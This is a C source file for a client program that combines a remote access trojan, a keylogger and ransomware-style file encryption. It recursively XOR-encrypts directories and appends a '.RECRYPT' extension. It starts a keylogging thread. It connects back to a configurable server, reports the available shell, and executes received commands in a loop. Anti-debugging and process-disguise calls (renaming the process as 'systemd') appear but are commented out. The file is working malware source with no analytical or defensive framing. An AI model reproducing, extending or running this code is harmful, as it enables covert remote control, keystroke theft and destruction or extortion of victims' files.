#include <dirent.h>
#include <sys/stat.h>
#include "client_base.h"
#include "anti_debug.h"
#include "stealth.h"
#include "crypto.h"
#include "postexp.h"
#include <unistd.h>
#include "command_handler.h" // Include the new command handler module

#define DEFAULT_PORT 8080
#define DEFAULT_IP "127.0.0.1"
#define BUFFER_SIZE 1024

void send_shell_type(int sockfd, const char *shell) {
    if (send(sockfd, shell, strlen(shell), 0) < 0) {
        perror("Error sending shell type to server");
    } else {
        printf("Sent shell type: %s\n", shell);
    }
}

void append_extension(char *filename, const char *extension, size_t max_len) {
    if (strlen(filename) + strlen(extension) >= max_len) {
        fprintf(stderr, "Filename too long to append extension.\n");
        return;
    }
    strcat(filename, extension);
}

void remove_extension(char *filename, const char *extension) {
    size_t len = strlen(filename);
    size_t ext_len = strlen(extension);
    if (len > ext_len && strcmp(filename + len - ext_len, extension) == 0) {
        filename[len - ext_len] = '\0';
    }
}

void process_file_with_extension(const char *filepath, const char *key, int mode, const char *extension) {
    char new_filename[BUFFER_SIZE];
    strncpy(new_filename, filepath, BUFFER_SIZE - 1);
    new_filename[BUFFER_SIZE - 1] = '\0';

    if (mode == 0) { // Encryption
        append_extension(new_filename, extension, BUFFER_SIZE);
        if (access(new_filename, F_OK) == 0) {
            printf("Skipping already encrypted file: %s\n", filepath);
            return;
        }
        xor_encrypt_decrypt(filepath, new_filename, key);
        printf("Encrypted: %s -> %s\n", filepath, new_filename);
    } else if (mode == 1) { // Decryption
        remove_extension(new_filename, extension);
        xor_encrypt_decrypt(filepath, new_filename, key);
        printf("Decrypted: %s -> %s\n", filepath, new_filename);
    }
}

void process_directory_recursive(const char *dir, const char *key, int mode) {
    DIR *dp = opendir(dir);
    if (!dp) {
        perror("Error opening directory");
        return;
    }

    struct dirent *entry;
    char filepath[BUFFER_SIZE];
    const char *extension = ".RECRYPT";

    while ((entry = readdir(dp)) != NULL) {
        snprintf(filepath, BUFFER_SIZE, "%s/%s", dir, entry->d_name);

        // Skip "." and ".."
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        struct stat file_stat;
        if (stat(filepath, &file_stat) == 0) {
            if (S_ISDIR(file_stat.st_mode)) {
                process_directory_recursive(filepath, key, mode); // Recurse into subdirectories
            } else if (S_ISREG(file_stat.st_mode)) {
                process_file_with_extension(filepath, key, mode, extension);
            }
        }
    }
    closedir(dp);
}

int main(int argc, char *argv[]) {
    int sockfd;
    struct sockaddr_in server_addr;
    char ip[BUFFER_SIZE] = DEFAULT_IP;
    int port = DEFAULT_PORT;
    char password[BUFFER_SIZE] = "";
    char xor_key[BUFFER_SIZE] = "mysecretpass1";
    char *encrypt_dir = NULL, *decrypt_dir = NULL;

    int opt;
    while ((opt = getopt(argc, argv, "i:p:w:e:d:k:")) != -1) {
        switch (opt) {
            case 'i':
                strncpy(ip, optarg, BUFFER_SIZE - 1);
                ip[BUFFER_SIZE - 1] = '\0';
                break;
            case 'p':
                port = atoi(optarg);
                break;
            case 'w':
                strncpy(password, optarg, BUFFER_SIZE - 1);
                password[BUFFER_SIZE - 1] = '\0';
                break;
            case 'e':
                encrypt_dir = optarg;
                break;
            case 'd':
                decrypt_dir = optarg;
                break;
            case 'k':
                strncpy(xor_key, optarg, BUFFER_SIZE - 1);
                xor_key[BUFFER_SIZE - 1] = '\0';
                break;
            default:
                print_usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (encrypt_dir && decrypt_dir) {
        fprintf(stderr, "Error: Cannot specify both -e and -d simultaneously.\n");
        exit(EXIT_FAILURE);
    }

    if (encrypt_dir) {
        printf("Encrypting files in directory: %s\n", encrypt_dir);
        process_directory_recursive(encrypt_dir, xor_key, 0);
        return 0;
    }

    if (decrypt_dir) {
        printf("Decrypting files in directory: %s\n", decrypt_dir);
        process_directory_recursive(decrypt_dir, xor_key, 1);
        return 0;
    }

    // Anti-debugging measures
    // anti_debug_ptrace();
    // anti_debug_proc();

    // Stealth measures
    // rename_process("systemd");
    // change_cmdline("systemd");

    // Start keylogging in a separate thread
    pthread_t keylogging_thread;
    if (pthread_create(&keylogging_thread, NULL, start_keylogging, NULL) != 0) {
        perror("Error starting keylogging thread");
    }
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Error creating socket");
        exit(EXIT_FAILURE);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid IP address");
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection to server failed");
        exit(EXIT_FAILURE);
    }
    printf("Connected to server at %s:%d\n", ip, port);

    if (!authenticate(sockfd, password)) {
        close(sockfd);
        return 1;
    }

    const char *shell = access("/bin/bash", X_OK) == 0 ? "/bin/bash" : "/bin/sh";
    send_shell_type(sockfd, shell);

char command_buffer[BUFFER_SIZE];
while (1) {
    ssize_t bytes_received = recv(sockfd, command_buffer, BUFFER_SIZE - 1, 0);
    if (bytes_received <= 0) {
        perror("Error receiving command or connection closed by server");
        break;
    }

    command_buffer[bytes_received] = '\0';

    if (strcmp(command_buffer, "exit") == 0) {
        printf("Exiting on server request...\n");
        break;
    }

    // Use the command handler to execute and send the response
    execute_and_send_command(sockfd, command_buffer, shell);
}

close(sockfd);
printf("Disconnected from server.\n");
return 0;
}